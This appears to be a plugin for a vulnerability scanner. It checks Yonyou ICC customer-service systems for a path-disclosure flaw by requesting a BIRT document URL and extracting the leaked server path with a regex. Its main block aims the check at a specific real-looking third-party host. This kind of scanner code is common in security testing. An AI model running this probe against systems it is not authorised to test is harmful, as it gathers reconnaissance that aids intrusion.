#!/usr/bin/evn python 
#--coding:utf-8--*--
#Name:用友icc客服系统路径泄露
#Refer:http://www.wooyun.org/bugs/wooyun-2010-057130
#Author:xq17

#!/usr/bin/env python
import re
def assign(service, arg):
    if service == "yongyou_icc":
        return True, arg
    

def audit(arg):
    url = arg + "birt/document?__document=1"
    code, head, res, errcode, _ = curl.curl2(url)
    if code == 200:
        res=res.replace('&#47;','/')
        m = re.search('#32;/([^<]+)(\d+)(.*)<br>', res)
        if m:
            security_info(m.group(1))
        
if __name__ == '__main__':
    from dummy import *
    audit(assign('yongyou_icc','http://im.e-picc.com.cn/')[1])